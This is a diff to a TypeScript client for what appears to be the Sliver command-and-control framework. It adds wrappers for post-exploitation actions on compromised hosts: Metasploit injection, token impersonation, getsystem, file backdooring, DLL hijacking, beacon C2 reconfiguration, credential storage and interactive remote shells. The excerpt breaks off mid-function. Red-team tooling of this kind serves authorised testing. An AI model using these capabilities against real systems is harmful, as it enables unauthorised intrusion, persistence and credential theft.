+          LHost: options.lhost,
+          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
+          Encoder: options.encoder ?? "",
+          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
+          PID: boundedUint32(options.pid, "Metasploit injection process id"),
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  msfRemoteSession(
+    sessionId: string,
+    options: MsfRemoteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.msfRemoteTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  msfRemoteBeacon(
+    beaconId: string,
+    options: MsfRemoteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.msfRemoteTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  runSshSession(
+    sessionId: string,
+    options: SshCommandOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.username, "SSH username");
+    assertNonEmptyString(options.hostname, "SSH hostname");
+    if (options.kerberosRealm && !options.kerberosKeytab) {
+      throw new Error("A Kerberos realm requires a keytab");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      let ownedPrivateKey = Buffer.alloc(0);
+      let ownedKeytab = Buffer.alloc(0);
+      try {
+        ownedPrivateKey = m4SecretCopy(options.privateKey, "SSH private key");
+        ownedKeytab = m4SecretCopy(options.kerberosKeytab, "Kerberos keytab");
+        return await this.workbenchArtifactRpc.runSSHCommand(
+          {
+            Username: options.username,
+            Hostname: options.hostname,
+            Port: boundedPort(options.port ?? 22, "SSH port"),
+            Command: Array.isArray(options.command) ? options.command.join(" ") : (options.command ?? ""),
+            Password: options.password ?? "",
+            PrivKey: ownedPrivateKey,
+            Krb5Conf: options.kerberosConfigPath ?? "/etc/krb5.conf",
+            Keytab: ownedKeytab,
+            Realm: options.kerberosRealm ?? "",
+            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        ownedPrivateKey.fill(0);
+        ownedKeytab.fill(0);
+      }
+    });
+  }
+
+  startRemoteServiceSession(
+    sessionId: string,
+    options: StartRemoteServiceOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertBoundedNonEmptyString(
+      options.hostname,
+      "Remote service hostname",
+      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceName,
+      "Remote service name",
+      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceDescription,
+      "Remote service description",
+      M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.binaryPath,
+      "Remote service binary path",
+      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
+    );
+    assertBoundedString(
+      options.args ?? "",
+      "Remote service arguments",
+      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
+    );
+
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.startService(
+        {
+          ServiceName: options.serviceName,
+          ServiceDescription: options.serviceDescription,
+          BinPath: options.binaryPath,
+          Hostname: options.hostname,
+          Arguments: options.args ?? "",
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  removeRemoteServiceSession(
+    sessionId: string,
+    options: RemoveRemoteServiceOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertBoundedNonEmptyString(
+      options.hostname,
+      "Remote service hostname",
+      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
+    );
+    assertBoundedNonEmptyString(
+      options.serviceName,
+      "Remote service name",
+      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
+    );
+
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.removeService(
+        {
+          ServiceInfo: {
+            Hostname: options.hostname,
+            ServiceName: options.serviceName,
+          },
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  private runAsTarget(request: CommonRequest, options: RunAsOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.username, "Run-as username");
+    assertNonEmptyString(options.processName, "Run-as process path");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.runAs(
+        {
+          Username: options.username,
+          ProcessName: options.processName,
+          Args: options.args ?? "",
+          Domain: options.domain ?? "",
+          Password: options.password ?? "",
+          HideWindow: !(options.showWindow ?? false),
+          NetOnly: options.netOnly ?? false,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  runAsSession(
+    sessionId: string,
+    options: RunAsOptions,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.runAsTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  runAsBeacon(
+    beaconId: string,
+    options: RunAsOptions,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.runAsTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private makeTokenTarget(request: CommonRequest, options: MakeTokenOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.username, "Token username");
+    assertNonEmptyString(options.password, "Token password");
+    const logonType = options.logonType ?? 9;
+    if (!isWindowsLogonType(logonType)) throw new Error("Unsupported Windows logon type");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.makeToken(
+        {
+          Username: options.username,
+          Password: options.password,
+          Domain: options.domain ?? "",
+          LogonType: logonType,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  makeTokenSession(
+    sessionId: string,
+    options: MakeTokenOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.makeTokenTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  makeTokenBeacon(
+    beaconId: string,
+    options: MakeTokenOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.makeTokenTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private impersonateTarget(request: CommonRequest, username: string, timeoutSeconds: number) {
+    assertNonEmptyString(username, "Impersonation username");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.impersonate({ Username: username, Request: request }, { signal }),
+    );
+  }
+
+  impersonateSession(
+    sessionId: string,
+    username: string,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.impersonateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), username, timeoutSeconds);
+  }
+
+  impersonateBeacon(
+    beaconId: string,
+    username: string,
+    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
+  ) {
+    return this.impersonateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), username, timeoutSeconds);
+  }
+
+  revToSelfSession(sessionId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.revToSelf({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  revToSelfBeacon(beaconId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.revToSelf({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  getSystemSession(
+    sessionId: string,
+    options: GetSystemOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const config = m4ImplantConfig(options.config);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      try {
+        return await this.rpc.getSystem(
+          {
+            HostingProcess: options.hostingProcess ?? "spoolsv.exe",
+            Config: config.value,
+            Name: "",
+            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        config.dispose();
+      }
+    }).finally(config.dispose);
+  }
+
+  getPrivsSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getPrivs({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  getPrivsBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getPrivs({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
+    );
+  }
+
+  backdoorSession(
+    sessionId: string,
+    options: BackdoorOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.filePath, "Backdoor remote file path");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.backdoor(
+        {
+          FilePath: options.filePath,
+          ProfileName: options.profileName ?? "",
+          Name: options.name ?? "",
+          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  hijackDllSession(
+    sessionId: string,
+    options: HijackDllOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertNonEmptyString(options.referenceDllPath, "Reference DLL path");
+    assertNonEmptyString(options.targetLocation, "DLL target location");
+    if (options.targetDll && options.profileName) {
+      throw new Error("DLL hijack accepts either target DLL bytes or a profile, not both");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      let ownedReferenceDll = Buffer.alloc(0);
+      let ownedTargetDll = Buffer.alloc(0);
+      try {
+        ownedReferenceDll = m4ArtifactCopy(options.referenceDll, "Reference DLL");
+        ownedTargetDll = m4ArtifactCopy(options.targetDll, "Target DLL");
+        return await this.artifactRpc.hijackDLL(
+          {
+            ReferenceDLLPath: options.referenceDllPath,
+            TargetLocation: options.targetLocation,
+            ReferenceDLL: ownedReferenceDll,
+            TargetDLL: ownedTargetDll,
+            ProfileName: options.profileName ?? "",
+            Name: options.name ?? "",
+            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        ownedReferenceDll.fill(0);
+        ownedTargetDll.fill(0);
+      }
+    });
+  }
+
+  killSession(sessionId: string, force = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.kill(
+        { Force: force, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  killBeacon(beaconId: string, force = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.kill(
+        { Force: force, Request: this.beaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  reconfigureBeacon(
+    beaconId: string,
+    options: BeaconReconfigureOptions,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ): Promise<Reconfigure> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.reconfigure(
+        {
+          ReconnectInterval: options.reconnectIntervalNanoseconds ?? "0",
+          BeaconInterval: options.intervalNanoseconds ?? "0",
+          BeaconJitter: options.jitterNanoseconds ?? "0",
+          C2URI: options.c2Uri ?? "",
+          Request: this.beaconRequest(beaconId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  openSessionFromBeacon(
+    beaconId: string,
+    c2s: string[],
+    delayNanoseconds = "0",
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ): Promise<OpenSession> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.openSession(
+        {
+          C2s: c2s,
+          Delay: delayNanoseconds,
+          Request: this.beaconRequest(beaconId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  closeSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.closeSession(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  getBeaconTasks(beaconId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<BeaconTasks> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.inventoryRpc.getBeaconTasks({ ID: beaconId }, { signal }),
+    );
+  }
+
+  fetchBeaconTask(taskId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<BeaconTask> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.taskContentRpc.getBeaconTaskContent({ ID: taskId }, { signal }),
+    );
+  }
+
+  cancelBeaconTask(taskId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<BeaconTask> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.artifactRpc.cancelBeaconTask({ ID: taskId }, { signal }),
+    );
   }
 
   getJobs(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Jobs> {
@@ -722,11 +2645,11 @@ export class SliverClient {
   }
 
   startTCPStagerListenerWithOptions(request: StagerListenerReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.startTCPStagerListener(request, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.startTCPStagerListener(request, { signal }));
   }
 
   getCompiler(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Compiler> {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.getCompiler(this.empty, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.getCompiler(this.empty, { signal }));
   }
 
   generateUniqueIP(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UniqueWGIP> {
@@ -734,7 +2657,7 @@ export class SliverClient {
   }
 
   generateImplant(config: ImplantConfig, name = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generate({ Config: config, Name: name }, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.generate({ Config: config, Name: name }, { signal }));
   }
 
   async generate(config: ImplantConfig, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
@@ -744,7 +2667,7 @@ export class SliverClient {
 
   generateSpoofMetadata(req: GenerateSpoofMetadataReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
     return withTimeoutSignal(timeoutSeconds, async (signal) => {
-      await this.rpc.generateSpoofMetadata(req, { signal });
+      await this.artifactRpc.generateSpoofMetadata(req, { signal });
     });
   }
 
@@ -755,12 +2678,12 @@ export class SliverClient {
 
   regenerateImplant(implantName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
     return withTimeoutSignal(timeoutSeconds, (signal) =>
-      this.rpc.regenerate({ ImplantName: implantName }, { signal }),
+      this.artifactRpc.regenerate({ ImplantName: implantName }, { signal }),
     );
   }
 
   generateStage(request: GenerateStageReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generateStage(request, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.generateStage(request, { signal }));
   }
 
   stageImplantBuild(buildNames: string[], timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
@@ -770,7 +2693,7 @@ export class SliverClient {
   }
 
   implantBuilds(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.implantBuilds(this.empty, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.implantBuilds(this.empty, { signal }));
   }
 
   deleteImplantBuild(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
@@ -784,7 +2707,7 @@ export class SliverClient {
   }
 
   implantProfiles(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.implantProfiles(this.empty, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.implantProfiles(this.empty, { signal }));
   }
 
   saveImplantProfile(profile: ImplantProfile, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
@@ -799,17 +2722,17 @@ export class SliverClient {
 
   lootAll(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, async (signal) => {
-      const res = await this.rpc.lootAll(this.empty, { signal });
+      const res = await this.inventoryRpc.lootAll(this.empty, { signal });
       return res.Loot;
     });
   }
 
   lootAdd(loot: Loot, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.lootAdd(loot, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.lootAdd(loot, { signal }));
   }
 
   lootUpdate(loot: Loot, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.lootUpdate(loot, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.lootUpdate(loot, { signal }));
   }
 
   lootRemove(lootId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
@@ -819,18 +2742,74 @@ export class SliverClient {
   }
 
   lootContent(lootId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.lootContent({ ID: lootId }, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.lootContent({ ID: lootId }, { signal }));
+  }
+
+  credentialsAll(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Credential[]> {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.inventoryRpc.creds(this.empty, { signal });
+      return response.Credentials;
+    });
+  }
+
+  credentialById(credentialId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Credential> {
+    assertBoundedNonEmptyString(credentialId, "Credential id", CREDENTIAL_ID_MAX_CHARACTERS);
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getCredByID({ ID: credentialId }, { signal }),
+    );
+  }
+
+  credentialAdd(credential: Credential, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
+    assertBoundedString(credential.Username, "Credential username", CREDENTIAL_METADATA_MAX_CHARACTERS);
+    assertBoundedString(credential.Collection, "Credential collection", CREDENTIAL_METADATA_MAX_CHARACTERS);
+    assertCredentialSecret(credential.Plaintext, "Credential plaintext");
+    assertCredentialSecret(credential.Hash, "Credential hash");
+    if (!credential.Plaintext && !credential.Hash) {
+      throw new Error("Credential plaintext or hash must not be empty");
+    }
+    if (!Number.isSafeInteger(credential.HashType)) {
+      throw new Error("Credential hash type must be an integer");
+    }
+    const request: Credential = {
+      ID: "",
+      Username: credential.Username,
+      Plaintext: credential.Plaintext,
+      Hash: credential.Hash,
+      HashType: credential.HashType,
+      IsCracked: Boolean(credential.Hash && credential.Plaintext),
+      OriginHostUUID: "",
+      Collection: credential.Collection,
+    };
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      await this.rpc.credsAdd({ Credentials: [request] }, { signal });
+    });
+  }
+
+  credentialRemove(credentialId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
+    assertBoundedNonEmptyString(credentialId, "Credential id", CREDENTIAL_ID_MAX_CHARACTERS);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      await this.rpc.credsRm({ Credentials: [{ ID: credentialId }] }, { signal });
+    });
+  }
+
+  credentialSniffHashType(hash: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Credential["HashType"]> {
+    assertCredentialSecret(hash, "Credential hash");
+    if (!hash) throw new Error("Credential hash must not be empty");
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.rpc.credsSniffHashType({ Hash: hash }, { signal });
+      return response.HashType;
+    });
   }
 
   websites(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, async (signal) => {
-      const res = await this.rpc.websites(this.empty, { signal });
+      const res = await this.inventoryRpc.websites(this.empty, { signal });
       return res.Websites;
     });
   }
 
   website(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.website({ Name: name }, { signal }));
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.artifactRpc.website({ Name: name }, { signal }));
   }
 
   websiteRemove(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
@@ -841,35 +2820,35 @@ export class SliverClient {
 
   websiteAddContent(name: string, contents: Record<string, WebContent>, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, (signal) =>
-      this.rpc.websiteAddContent({ Name: name, Contents: contents }, { signal }),
+      this.artifactRpc.websiteAddContent({ Name: name, Contents: contents }, { signal }),
     );
   }
 
   websiteUpdateContent(name: string, contents: Record<string, WebContent>, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, (signal) =>
-      this.rpc.websiteUpdateContent({ Name: name, Contents: contents }, { signal }),
+      this.artifactRpc.websiteUpdateContent({ Name: name, Contents: contents }, { signal }),
     );
   }
 
   websiteRemoveContent(name: string, paths: string[], timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
     return withTimeoutSignal(timeoutSeconds, (signal) =>
-      this.rpc.websiteRemoveContent({ Name: name, Paths: paths }, { signal }),
+      this.artifactRpc.websiteRemoveContent({ Name: name, Paths: paths }, { signal }),
     );
   }
 
   // --- High-level helpers (ergonomic wrappers) ---
 
-  async operators(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+  async operators(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Operator[]> {
     const res = await this.getOperators(timeoutSeconds);
     return res.Operators;
   }
 
-  async sessions(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+  async sessions(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Session[]> {
     const res = await this.getSessions(timeoutSeconds);
     return res.Sessions;
   }
 
-  async beacons(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+  async beacons(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Beacon[]> {
     const res = await this.getBeacons(timeoutSeconds);
     return res.Beacons;
   }
@@ -879,19 +2858,712 @@ export class SliverClient {
     return res.Active;
   }
 
+  /**
+   * Opens a session shell through the bounded tunnel stream. Standalone
+   * callers receive this RPC-capable handle directly; applications with an
+   * untrusted renderer must keep it behind their own narrow process boundary.
+   */
+  async startShellSession(
+    sessionId: string,
+    options: ShellSessionOptions,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ): Promise<ShellSessionHandle> {
+    assertNonEmptyString(sessionId, "Session id");
+    if (!options || typeof options !== "object") throw new Error("Shell options are required");
+    assertNonEmptyString(options.path, "Shell path");
+    if (typeof options.pty !== "boolean") throw new Error("Shell PTY flag must be a boolean");
+    const rows = shellTerminalDimension(options.rows, "Shell rows");
+    const cols = shellTerminalDimension(options.cols, "Shell columns");
+    const outputBufferBytes = shellOutputBufferBytes(options.outputBufferBytes);
+    const request = this.sessionRequest(sessionId, timeoutSeconds);
+
+    const tunnels = this.tunnels;
+    if (!tunnels) throw new Error("SliverClient is not connected");
+
+    let tunnelId = "";
+    let lifecycle: "starting" | "open" | "closing" | "closed" = "starting";
+    let closePromise: Promise<void> | null = null;
+    let writeTail: Promise<void> = Promise.resolve();
+    let pendingWriteOperations = 0;
+    let pendingWriteBytes = 0;
+    let resolveRemoteClosed: (() => void) | undefined;
+    const remoteClosed = new Promise<void>((resolve) => {
+      resolveRemoteClosed = resolve;
+    });
+
+    const bestEffortRemoteClose = async (): Promise<void> => {
+      if (!tunnelId) return;
+      await withTimeoutSignal(timeoutSeconds, (signal) =>
+        this.rpc.closeTunnel({ TunnelID: tunnelId, SessionID: sessionId }, { signal }),
+      ).catch(() => undefined);
+    };
+
+    const sendGracefulExit = async (): Promise<void> => {
+      await writeTail.catch(() => undefined);
+      for (const command of ["exit\n", "logout\n"] as const) {
+        const bytes = Buffer.from(command);
+        try {
+          await tunnels.send({
+            TunnelID: tunnelId,
+            SessionID: sessionId,
+            Data: bytes,
+          });
+        } catch {
+          return;
+        } finally {
+          bytes.fill(0);
+        }
+      }
+    };
+
+    const boundedGracefulExit = async (): Promise<void> => {
+      let timer: ReturnType<typeof setTimeout> | undefined;
+      try {
+        await Promise.race([
+          (async () => {
+            await sendGracefulExit();
+            // TunnelManager.send() resolves when the gRPC request stream pulls
+            // a frame, not when the implant consumes it. Hold CloseTunnel long
+            // enough for the exact remote EOF so it cannot overtake exit/logout.
+            await remoteClosed;
+          })(),
+          new Promise<void>((resolve) => {
+            timer = setTimeout(resolve, SHELL_GRACEFUL_CLOSE_TIMEOUT_MILLISECONDS);
+            timer.unref?.();
+          }),
+        ]);
+      } finally {
+        if (timer) clearTimeout(timer);
+      }
+    };
+
+    const closeManagedTunnel = (requestGracefulExit = false): Promise<void> => {
+      if (closePromise) return closePromise;
+      lifecycle = "closing";
+      closePromise = (async () => {
+        if (requestGracefulExit && tunnelId) await boundedGracefulExit();
+        if (tunnelId) tunnels.cancelTunnel(tunnelId);
+        await bestEffortRemoteClose();
+      })().finally(() => {
+          lifecycle = "closed";
+        });
+      return closePromise;
+    };
+
+    try {
+      const created = await withTimeoutSignal(timeoutSeconds, (signal) =>
+        this.rpc.createTunnel({ SessionID: sessionId }, { signal }),
+      );
+      tunnelId = created.TunnelID.trim();
+      if (!tunnelId) throw new Error("Missing tunnel id");
+
+      const output = tunnels.openOutput(tunnelId, {
+        maxBufferedBytes: outputBufferBytes,
+        onClosed: () => {
+          lifecycle = "closed";
+          resolveRemoteClosed?.();
+          closePromise ??= Promise.resolve();
+        },
+        onFailure: () => {
+          void closeManagedTunnel();
+        },
+      });
+
+      // The zero-data bind must be pulled by TunnelData before Shell can race
+      // an early prompt back to this process.
+      await tunnels.send({
+        TunnelID: tunnelId,
+        SessionID: sessionId,
+        Data: Buffer.alloc(0),
+      });
+
+      const shell = await withTimeoutSignal(timeoutSeconds, (signal) =>
+        this.rpc.shell(
+          {
+            Path: options.path,
+            EnablePTY: options.pty,
+            Pid: 0,
+            Rows: rows,
+            Cols: cols,
+            TunnelID: tunnelId,
+            Request: request,
+          },
+          { signal },
+        ),
+      );
+      if (shell.Response?.Err) throw new Error("Shell rejected");
+      // A force-terminate action is exposed only for this exact child PID.
+      // Never mint that authority for process-group/idle/kernel sentinel IDs.
+      if (!Number.isSafeInteger(shell.Pid) || shell.Pid <= 1 || shell.Pid > 0x7fff_ffff) {
+        throw new Error("Invalid shell pid");
+      }
+      if (shell.TunnelID && shell.TunnelID !== tunnelId) throw new Error("Mismatched shell tunnel");
+      if (lifecycle !== "starting") throw new Error("Shell closed during startup");
+      lifecycle = "open";
+
+      const ensureOpen = (): void => {
+        if (lifecycle !== "open") throw new Error("Shell session is closed");
+      };
+      const ensureNotClosed = (): void => {
+        if (lifecycle === "closed") throw new Error("Shell session is closed");
+      };
+
+      return {
+        id: tunnelId,
+        pid: shell.Pid,
+        path: options.path,
+        ptyRequested: options.pty,
+        output,
+        write: async (chunk) => {
+          ensureOpen();
+          const bytes = shellWriteBytes(chunk);
+          const writeCost = Math.max(bytes.length, 1);
+          if (
+            pendingWriteOperations >= SHELL_WRITE_MAX_PENDING_OPERATIONS
+            || pendingWriteBytes + writeCost > SHELL_WRITE_MAX_BYTES
+          ) {
+            bytes.fill(0);
+            throw new Error("Shell write exceeded its bounded queue");
+          }
+          pendingWriteOperations += 1;
+          pendingWriteBytes += writeCost;
+          const operation = writeTail.then(async () => {
+            ensureNotClosed();
+            try {
+              for (let offset = 0; offset < bytes.length; offset += TUNNEL_STREAM_MAX_PAYLOAD_BYTES) {
+                ensureNotClosed();
+                await tunnels.send({
+                  TunnelID: tunnelId,
+                  SessionID: sessionId,
+                  Data: bytes.subarray(offset, offset + TUNNEL_STREAM_MAX_PAYLOAD_BYTES),
+                });
+              }
+            } catch {
+              throw new Error("Unable to write to shell session");
+            }
+          }).finally(() => {
+            bytes.fill(0);
+            pendingWriteOperations -= 1;
+            pendingWriteBytes -= writeCost;
+          });
+          writeTail = operation.catch(() => undefined);
+          return operation;
+        },
+        resize: async (nextRows, nextCols) => {
+          ensureOpen();
+          if (!options.pty) throw new Error("Shell resize requires a PTY");
+          const validatedRows = shellTerminalDimension(nextRows, "Shell rows");
+          const validatedCols = shellTerminalDimension(nextCols, "Shell columns");
+          try {
+            await withTimeoutSignal(timeoutSeconds, (signal) =>
+              this.rpc.shellResize(
+                {
+                  Rows: validatedRows,
+                  Cols: validatedCols,
+                  TunnelID: tunnelId,
+                  Request: this.sessionRequest(sessionId, timeoutSeconds),
+                },
+                { signal },
